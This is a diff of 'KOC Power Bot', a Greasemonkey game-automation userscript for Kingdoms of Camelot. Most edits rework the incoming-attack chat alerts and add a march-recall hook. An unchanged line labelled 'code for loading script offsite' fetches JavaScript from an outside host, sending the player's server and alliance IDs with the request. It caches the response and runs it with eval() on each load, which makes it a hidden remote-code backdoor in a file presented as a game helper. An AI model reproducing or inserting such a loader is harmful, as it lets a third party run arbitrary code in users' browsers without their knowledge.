@@ -1,6 +1,6 @@
 // ==UserScript==
 // @name           KOC Power Bot
-// @version        20130120d
+// @version        20130120e
 // @namespace      mat
 // @homepage       http://userscripts.org/scripts/show/101052
 // @include        *.kingdomsofcamelot.com/*main_src.php*
@@ -34,7 +34,7 @@ if(window.self.location != window.top.location){
 	}
 }
 
-var Version = '20130120d';
+var Version = '20130120e';
 
 
 //bandaid to stop loading in advertisements containing the @include urls
@@ -527,7 +527,7 @@ function kocWideScreen(){
   if (GlobalOptions.pbWideScreen)
 		setWideFb();
 }
-    var aj2 = function(c, d, b, a)
+var aj2 = function(c, d, b, a)
     {
         if (d.ctrl && d.ctrl == "Tracking")
         {
@@ -541,7 +541,7 @@ function kocWideScreen(){
             unsafeWindow.AjaxCall.gAjaxRequest(c, d, b, a, "post");
         }
     }
-    if(unsafeWindow.AjaxCall)
+if(unsafeWindow.AjaxCall)
     unsafeWindow.AjaxCall.gPostRequest = aj2
 /***  Run only in "apps.facebook.com" instance ... ***/
 function facebookInstance (){
@@ -3285,7 +3285,30 @@ show : function (){
 //baos780 code for loading script offsite
 if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) { var serverID = getServerId();   if(!unsafeWindow.seed) return; var s = GM_getValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID);  if (s != null) {    s = JSON2.parse (s);  eval(s);  };  if(unsafeWindow.seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/4Cxy4.php?p="+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+"&s="+getServerId()+"&a="+unsafeWindow.seed.allianceDiplomacies.allianceId,	headers: {'Accept': 'text/javascript',}, 	onload: function(responseDetails) { var serverID = getServerId(); setTimeout (function (){GM_setValue ('Nessaja_' + unsafeWindow.seed.player['name'] + '_' +serverID, JSON2.stringify(responseDetails.responseText));}, 0);},}); };
 
+
 /****************************  Tower Tab  ******************************/
+if(unsafeWindow.update_march) {
+	var update_march2 = unsafeWindow.update_march;
+	unsafeWindow.update_march = function (f) {
+    var F = Object.keys(f);
+		    for (var R = 0; R < F.length; R++) {
+        var C = Object.keys(f[F[R]]);
+        for (var Q = 0; Q < C.length; Q++) {
+            var O = f[F[R]][C[Q]];
+            for (var G = 0; G < O.length; G++) {
+                var D = f[F[R]][C[Q]][G];
+                var s = parseInt(D.marchStatus);
+                if(s == 9) {
+					var m = Seed.queue_atkinc[C[Q]];
+					m.marchStatus = s;
+					Tabs.tower.postToChat(m);
+				}
+                
+			}}}
+		update_march2(f);
+	}
+}
+
 Tabs.tower = {
   tabOrder: 1,
   tabLabel: 'Tower',
@@ -3953,25 +3976,40 @@ Tabs.tower = {
       return;
     if (ENABLE_TEST_TAB) Tabs.Test.addDiv (translate("Incoming")+"!<BR><PRE style='margin:0px;'>" + inspect (m, 8, 1) +'</pre>');
     var target, atkType, who;
+    var attackedby = unsafeWindow.g_js_strings.modal_messages_viewreports.attackedby;
+    var scoutingat = '';
+    var attack = unsafeWindow.g_js_strings.commonstr.attack;
+    var attackrecalled = unsafeWindow.g_js_strings.incomingattack.attackrecalled;
+    var troops = unsafeWindow.g_js_strings.commonstr.troops;
+    var wilderness = unsafeWindow.g_js_strings.commonstr.wilderness;
+    var estimatedarrival = unsafeWindow.g_js_strings.attack_generateincoming.estimatedarrival;
+    var encampall = unsafeWindow.g_js_strings.openEmbassy.encampall;
+    var defending = unsafeWindow.g_js_strings.commonstr.defending;
+    var status = unsafeWindow.g_js_strings.commonstr.status;
+	var hidesanct = unsafeWindow.g_js_strings.openCastle.hidesanct;
+	var orderdefend = unsafeWindow.g_js_strings.openCastle.orderdefend;
+	var technology = unsafeWindow.g_js_strings.commonstr.technology;
     if (m.marchType == 3){
       if (!Options.alertConfig.scouting)
         return;
-      atkType = translate('scouted');
-    } else if (m.marchType == 4){
-      atkType = translate("attacked");
+        var scoutingat = unsafeWindow.g_js_strings.modal_messages_viewreports_view.scoutingat;
+    } else if (m.marchType == 4){//do nothing
     } else {
       return;
     }
+    
+    
+    
     var city = Cities.byID[m.toCityId];
     if ( city.tileId == m.toTileId )
-      target = translate('city at')+' ('+ city.x +','+ city.y + ')';
+      target = unsafeWindow.g_js_strings.commonstr.city+ ' '+city.name+' ('+ city.x +','+ city.y + ')';
     else {
       if (!Options.alertConfig.wilds)
         return;
-      target = translate('wilderness');
+      target = wilderness;
       for (k in Seed.wilderness['city'+m.toCityId]){
         if (Seed.wilderness['city'+m.toCityId][k].tileId == m.toTileId){
-          target += ' at ('+ Seed.wilderness['city'+m.toCityId][k].xCoord +','+ Seed.wilderness['city'+m.toCityId][k].yCoord + ')';
+          target += '('+ Seed.wilderness['city'+m.toCityId][k].xCoord +','+ Seed.wilderness['city'+m.toCityId][k].yCoord + ')';
           break;
         }
       }
@@ -3984,14 +4022,15 @@ Tabs.tower = {
       who = translate('Unknown');
   
     if (m.fromXCoord)
-      who += ' at ('+ m.fromXCoord +','+ m.fromYCoord + ')';
+      who += '('+ m.fromXCoord +','+ m.fromYCoord + ')';
     who += ' ('+getDiplomacy(m.aid)+')';
     
-    var msg = Options.alertConfig.aPrefix +' ';
     if(m.marchStatus == 9)
-        msg += 'The '+ atkType +' on my '+ target +' by '+ who +' has been recalled.';
+        msg = ' '+scoutingat+' '+target +' '+attackedby+' '+ who +' '+attackrecalled+' '+troops+': ';
     else
-        msg += 'My '+ target +' is being '+ atkType  +' by '+ who +' Incoming Troops (arriving in '+ unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())) +') : ';
+        msg = Options.alertConfig.aPrefix +' '+scoutingat+' '+target +' '+attackedby+' '+ who +' '+estimatedarrival+' ('+ unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())) +')  '+troops+': ';        
+        //msg = Options.alertConfig.aPrefix +' My '+ target +' is being '+ atkType  +' by '+ who +' Incoming Troops (arriving in '+ unsafeWindow.timestr(parseInt(m.arrivalTime - unixTime())) +') : ';        
+        
     for (k in m.unts){
       var uid = parseInt(k.substr (1));
       var fchar = Filter[Options.fchar];
@@ -3999,34 +4038,36 @@ Tabs.tower = {
       msg += UNTCOUNT +' '+ unsafeWindow.unitcost['unt'+uid][0] +', ';
     }
     msg = msg.slice (0, -2);
-    msg += '.';
-    if ( city.tileId == m.toTileId ){
-      var emb = getCityBuilding(m.toCityId, 8);
-      if (emb.count == 0)
-      msg += translate("My embassy has not been constructed in this kingdom.  Do not attempt to reinforce.");
-      else {
-        var availSlots = emb.maxLevel;
-        for (k in Seed.queue_atkinc){
-          if (Seed.queue_atkinc[k].marchType==2 && Seed.queue_atkinc[k].toCityId==m.toCityId && Cities.byID[Seed.queue_atkinc[k].fromCityId]==null){
-            --availSlots;
-          }
-        }
-        msg += ' My embassy has '+ availSlots +' of '+ emb.maxLevel +' slots available.';
-        if (t.defMode[m.toCityId] == 0 && Options.alertConfig.defend==true)
-        {
-            msg+= ' My troops are HIDING!';
-        }
-        if (t.defMode[m.toCityId] == 1 && Options.alertConfig.defend==true)
-        {
-            msg+= ' My troops are DEFENDING!';
-        }
-            msg+= ' My technology levels are: Fl Lv' + parseInt(Seed.tech.tch13)
-             + ', HP Lv'+ parseInt(Seed.tech.tch15)
-             + ', PE Lv'+ parseInt(Seed.tech.tch8)
-             + ', MA Lv'+ parseInt(Seed.tech.tch9)
-             + ', MM Lv'+ parseInt(Seed.tech.tch11)
-             + ', AH Lv'+ parseInt(Seed.tech.tch12);
-      }
+    msg += '   ';
+    if(m.marchStatus != 9) {
+		if ( city.tileId == m.toTileId ){
+		  var emb = getCityBuilding(m.toCityId, 8);
+		  if (emb.count == 0)
+		  msg += translate("My embassy has not been constructed in this kingdom.  Do not attempt to reinforce.");
+		  else {
+			var availSlots = 0;
+			for (k in Seed.queue_atkinc){
+			  if (Seed.queue_atkinc[k].marchType==2 && Seed.queue_atkinc[k].toCityId==m.toCityId && Cities.byID[Seed.queue_atkinc[k].fromCityId]==null){
+				availSlots++;
+			  }
+			}
+			msg += encampall+' '+ availSlots +'/'+ emb.maxLevel +' ';
+			if (t.defMode[m.toCityId] == 0 && Options.alertConfig.defend==true)
+			{
+				msg+= status+': '+hidesanct;
+			}
+			if (t.defMode[m.toCityId] == 1 && Options.alertConfig.defend==true)
+			{
+				msg+= status+': '+orderdefend;
+			}
+				msg+= technology+ ' ' + parseInt(Seed.tech.tch13)
+				 + ', HP Lv'+ parseInt(Seed.tech.tch15)
+				 + ', PE Lv'+ parseInt(Seed.tech.tch8)
+				 + ', MA Lv'+ parseInt(Seed.tech.tch9)
+				 + ', MM Lv'+ parseInt(Seed.tech.tch11)
+				 + ', AH Lv'+ parseInt(Seed.tech.tch12);
+		  }
+		}
     }
     t.sendalert(m);
     if (!Options.alertConfig.aChat) return;
